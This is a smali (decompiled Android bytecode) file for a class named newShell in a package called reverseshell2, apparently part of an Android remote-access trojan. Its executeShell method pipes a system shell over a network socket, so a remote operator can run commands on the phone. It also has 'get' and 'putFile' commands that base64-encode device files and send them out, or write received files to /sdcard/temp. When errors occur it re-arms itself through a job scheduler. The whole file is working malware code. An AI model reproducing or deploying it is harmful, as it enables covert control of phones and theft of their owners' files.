.class public Lcom/example/reverseshell2/Payloads/newShell;
.super Ljava/lang/Object;
.source "newShell.java"


# static fields
.field static TAG:Ljava/lang/String;


# instance fields
.field activity:Landroid/app/Activity;

.field context:Landroid/content/Context;

.field functions:Lcom/example/reverseshell2/functions;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "newTAGClass"

    sput-object v0, Lcom/example/reverseshell2/Payloads/newShell;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/app/Activity;Landroid/content/Context;)V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p2, p0, Lcom/example/reverseshell2/Payloads/newShell;->context:Landroid/content/Context;

    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/newShell;->activity:Landroid/app/Activity;

    new-instance v0, Lcom/example/reverseshell2/functions;

    invoke-direct {v0, p1}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/newShell;->functions:Lcom/example/reverseshell2/functions;

    return-void
.end method

.method private getBase64Data(Ljava/io/File;)Ljava/lang/String;
    .locals 8

    const/4 v0, 0x0

    new-array v1, v0, [B

    const/4 v2, 0x0

    :try_start_0
    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v3

    long-to-int v4, v3

    new-array v3, v4, [B

    move-object v1, v3

    sget-object v3, Lcom/example/reverseshell2/Payloads/newShell;->TAG:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v4

    invoke-static {v4, v5}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/32 v5, 0xf42400

    cmp-long v7, v3, v5

    if-lez v7, :cond_0

    return-object v2

    :cond_0
    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-virtual {v3, v1}, Ljava/io/InputStream;->read([B)I

    invoke-virtual {v3}, Ljava/io/InputStream;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v3

    invoke-virtual {v3}, Ljava/io/IOException;->printStackTrace()V

    :goto_0
    const-string v3, ""

    :try_start_1
    invoke-static {v1, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v0
    :try_end_1
    .catch Landroid/util/AndroidRuntimeException; {:try_start_1 .. :try_end_1} :catch_1

    nop

    return-object v0

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Landroid/util/AndroidRuntimeException;->printStackTrace()V

    return-object v2
.end method

.method private setBase64Data(Ljava/lang/String;Ljava/lang/String;)V
    .locals 5

    const-string v0, "/sdcard/temp"

    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    invoke-virtual {v1}, Ljava/io/File;->mkdir()Z

    :cond_0
    new-instance v2, Ljava/io/File;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-eqz v3, :cond_1

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    :cond_1
    new-instance v3, Ljava/lang/Thread;

    new-instance v4, Lcom/example/reverseshell2/Payloads/newShell$2;

    invoke-direct {v4, p0, v2, p2}, Lcom/example/reverseshell2/Payloads/newShell$2;-><init>(Lcom/example/reverseshell2/Payloads/newShell;Ljava/io/File;Ljava/lang/String;)V

    invoke-direct {v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method public executeShell(Ljava/net/Socket;Ljava/io/OutputStream;)V
    .locals 26
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    move-object/from16 v1, p0

    move-object/from16 v2, p2

    const-string v3, "|_|"

    const-string v4, "UTF-8"

    const-string v0, "----------Starting Shell----------\n"

    invoke-virtual {v0, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/OutputStream;->write([B)V

    const-string v5, "END123\n"

    invoke-virtual {v5, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/OutputStream;->write([B)V

    const-string v6, "system/bin/sh"

    new-instance v0, Ljava/lang/ProcessBuilder;

    const/4 v7, 0x1

    new-array v8, v7, [Ljava/lang/String;

    const/4 v9, 0x0

    aput-object v6, v8, v9

    invoke-direct {v0, v8}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V

    invoke-virtual {v0, v7}, Ljava/lang/ProcessBuilder;->redirectErrorStream(Z)Ljava/lang/ProcessBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v10

    invoke-virtual {v8}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;

    move-result-object v11

    invoke-virtual/range {p1 .. p1}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v12

    invoke-virtual {v8}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v13

    invoke-virtual/range {p1 .. p1}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v14

    new-instance v0, Ljava/io/BufferedReader;

    new-instance v15, Ljava/io/InputStreamReader;

    invoke-direct {v15, v12}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v0, v15}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v15, v0

    new-instance v0, Ljava/io/BufferedReader;

    new-instance v9, Ljava/io/InputStreamReader;

    invoke-direct {v9, v10}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v0, v9}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v9, v0

    :goto_0
    invoke-virtual/range {p1 .. p1}, Ljava/net/Socket;->isClosed()Z

    move-result v0

    if-nez v0, :cond_a

    :goto_1
    :try_start_0
    invoke-virtual {v10}, Ljava/io/InputStream;->available()I

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_b

    const-string v7, "\n"

    const-string v2, ""

    if-lez v0, :cond_1

    move-object v0, v2

    :goto_2
    :try_start_1
    invoke-virtual {v9}, Ljava/io/BufferedReader;->ready()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-virtual {v9}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-object/from16 v18, v6

    :try_start_2
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    move-object v0, v6

    move-object/from16 v6, v18

    goto :goto_2

    :cond_0
    move-object/from16 v18, v6

    sget-object v2, Lcom/example/reverseshell2/Payloads/newShell;->TAG:Ljava/lang/String;

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v0, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v14, v2}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v5, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v14, v2}, Ljava/io/OutputStream;->write([B)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    move-object/from16 v2, p2

    move-object/from16 v6, v18

    const/4 v7, 0x1

    goto :goto_1

    :catch_0
    move-exception v0

    move-object/from16 v18, v6

    move-object/from16 v23, v9

    move-object/from16 v24, v10

    const/4 v7, 0x1

    const/16 v16, 0x0

    goto/16 :goto_8

    :cond_1
    move-object/from16 v18, v6

    :goto_3
    :try_start_3
    invoke-virtual {v11}, Ljava/io/InputStream;->available()I

    move-result v0
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_a

    if-lez v0, :cond_2

    :try_start_4
    invoke-virtual {v11}, Ljava/io/InputStream;->read()I

    move-result v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write(I)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_3

    :catch_1
    move-exception v0

    move-object/from16 v23, v9

    move-object/from16 v24, v10

    const/4 v7, 0x1

    const/16 v16, 0x0

    goto/16 :goto_8

    :cond_2
    :goto_4
    :try_start_5
    invoke-virtual {v12}, Ljava/io/InputStream;->available()I

    move-result v0

    if-lez v0, :cond_8

    invoke-virtual {v15}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    move-object v0, v6

    sget-object v6, Lcom/example/reverseshell2/Payloads/newShell;->TAG:Ljava/lang/String;

    invoke-static {v6, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v6, "putFile"

    invoke-virtual {v0, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v6
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_a

    if-eqz v6, :cond_3

    :try_start_6
    const-string v6, "\\<"

    invoke-virtual {v0, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    const/16 v17, 0x1

    aget-object v19, v6, v17

    move-object/from16 v20, v19

    const/16 v19, 0x2

    aget-object v19, v6, v19

    move-object/from16 v21, v19

    const/16 v19, 0x3

    aget-object v19, v6, v19

    move-object/from16 v22, v19

    move-object/from16 v19, v6

    move-object/from16 v6, v22

    invoke-virtual {v6, v5, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v22

    move-object/from16 v6, v22

    move-object/from16 v22, v7

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    move-object/from16 v23, v9

    move-object/from16 v9, v20

    :try_start_7
    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v20, v9

    const-string v9, "."

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v9, v21

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v1, v7, v6}, Lcom/example/reverseshell2/Payloads/newShell;->setBase64Data(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    move-object/from16 v19, v2

    move-object/from16 v24, v10

    const/4 v7, 0x1

    const/16 v16, 0x0

    goto/16 :goto_6

    :catch_2
    move-exception v0

    move-object/from16 v24, v10

    const/4 v7, 0x1

    const/16 v16, 0x0

    goto/16 :goto_8

    :catch_3
    move-exception v0

    move-object/from16 v23, v9

    move-object/from16 v24, v10

    const/4 v7, 0x1

    const/16 v16, 0x0

    goto/16 :goto_8

    :cond_3
    move-object/from16 v22, v7

    move-object/from16 v23, v9

    :try_start_8
    const-string v6, "get "

    invoke-virtual {v0, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_6

    const-string v6, " "

    invoke-virtual {v0, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_7

    const/4 v7, 0x1

    :try_start_9
    aget-object v6, v6, v7
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_6

    :try_start_a
    invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v6

    sget-object v7, Lcom/example/reverseshell2/Payloads/newShell;->TAG:Ljava/lang/String;

    invoke-static {v7, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v7, Ljava/io/File;

    invoke-direct {v7, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7}, Ljava/io/File;->exists()Z

    move-result v9

    if-eqz v9, :cond_5

    move-object v9, v2

    move-object/from16 v19, v2

    const-string v2, "/"

    invoke-virtual {v6, v2}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v2

    const/16 v17, 0x1

    add-int/lit8 v2, v2, 0x1

    invoke-virtual {v6, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v20, v6

    const-string v6, "\\."

    invoke-virtual {v2, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    move-object/from16 v21, v2

    sget-object v2, Lcom/example/reverseshell2/Payloads/newShell;->TAG:Ljava/lang/String;
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_7

    move-object/from16 v24, v10

    :try_start_b
    const-string v10, "exists"

    invoke-static {v2, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-direct {v1, v7}, Lcom/example/reverseshell2/Payloads/newShell;->getBase64Data(Ljava/io/File;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_4

    const-string v10, "Cant transfer Large File\nEND123\n"

    invoke-virtual {v10, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    :cond_4
    const-string v10, "getFile\nEND123\n"

    invoke-virtual {v10, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_5

    move-object/from16 v25, v7

    const/16 v16, 0x0

    :try_start_c
    aget-object v7, v6, v16

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_4

    move-object/from16 v17, v9

    const/4 v7, 0x1

    :try_start_d
    aget-object v9, v6, v7

    invoke-virtual {v10, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "\nEND123\n"

    invoke-virtual {v10, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    goto :goto_5

    :catch_4
    move-exception v0

    const/4 v7, 0x1

    goto/16 :goto_8

    :catch_5
    move-exception v0

    const/4 v7, 0x1

    const/16 v16, 0x0

    goto/16 :goto_8

    :cond_5
    move-object/from16 v19, v2

    move-object/from16 v20, v6

    move-object/from16 v25, v7

    move-object/from16 v24, v10

    const/4 v7, 0x1

    const/16 v16, 0x0

    sget-object v2, Lcom/example/reverseshell2/Payloads/newShell;->TAG:Ljava/lang/String;

    const-string v6, "notexists"

    invoke-static {v2, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v2, "File Doesnt Exists\nEND123\n"

    invoke-virtual {v2, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v14, v2}, Ljava/io/OutputStream;->write([B)V

    :goto_5
    goto :goto_6

    :catch_6
    move-exception v0

    move-object/from16 v24, v10

    goto :goto_7

    :cond_6
    move-object/from16 v19, v2

    move-object/from16 v24, v10

    const/4 v7, 0x1

    const/16 v16, 0x0

    const-string v2, "put "

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_7

    const-string v2, "putFile\nEND123\n"

    invoke-virtual {v2, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v14, v2}, Ljava/io/OutputStream;->write([B)V

    goto :goto_6

    :cond_7
    invoke-virtual {v0, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v13, v2}, Ljava/io/OutputStream;->write([B)V

    :goto_6
    move-object/from16 v2, v19

    move-object/from16 v7, v22

    move-object/from16 v9, v23

    move-object/from16 v10, v24

    goto/16 :goto_4

    :catch_7
    move-exception v0

    move-object/from16 v24, v10

    const/4 v7, 0x1

    :goto_7
    const/16 v16, 0x0

    goto :goto_8

    :cond_8
    move-object/from16 v23, v9

    move-object/from16 v24, v10

    const/4 v7, 0x1

    const/16 v16, 0x0

    invoke-virtual {v14}, Ljava/io/OutputStream;->flush()V

    invoke-virtual {v13}, Ljava/io/OutputStream;->flush()V

    const-wide/16 v9, 0x32

    invoke-static {v9, v10}, Ljava/lang/Thread;->sleep(J)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_9

    :try_start_e
    invoke-virtual {v8}, Ljava/lang/Process;->exitValue()I
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_8

    goto :goto_b

    :catch_8
    move-exception v0

    goto :goto_a

    :catch_9
    move-exception v0

    goto :goto_8

    :catch_a
    move-exception v0

    move-object/from16 v23, v9

    move-object/from16 v24, v10

    const/4 v7, 0x1

    const/16 v16, 0x0

    goto :goto_8

    :catch_b
    move-exception v0

    move-object/from16 v18, v6

    move-object/from16 v23, v9

    move-object/from16 v24, v10

    const/16 v16, 0x0

    :goto_8
    const-string v2, "service_runner"

    const-string v6, "called"

    invoke-static {v2, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v6, 0x15

    if-lt v2, v6, :cond_9

    iget-object v2, v1, Lcom/example/reverseshell2/Payloads/newShell;->functions:Lcom/example/reverseshell2/functions;

    iget-object v6, v1, Lcom/example/reverseshell2/Payloads/newShell;->context:Landroid/content/Context;

    invoke-virtual {v2, v6}, Lcom/example/reverseshell2/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_9

    :cond_9
    iget-object v2, v1, Lcom/example/reverseshell2/Payloads/newShell;->activity:Landroid/app/Activity;

    new-instance v6, Lcom/example/reverseshell2/Payloads/newShell$1;

    invoke-direct {v6, v1}, Lcom/example/reverseshell2/Payloads/newShell$1;-><init>(Lcom/example/reverseshell2/Payloads/newShell;)V

    invoke-virtual {v2, v6}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    :goto_9
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_a
    move-object/from16 v2, p2

    move-object/from16 v6, v18

    move-object/from16 v9, v23

    move-object/from16 v10, v24

    goto/16 :goto_0

    :cond_a
    move-object/from16 v18, v6

    move-object/from16 v23, v9

    move-object/from16 v24, v10

    :goto_b
    const-string v0, "Exiting\n"

    invoke-virtual {v0, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v5, v4}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v8}, Ljava/lang/Process;->destroy()V

    return-void
.end method
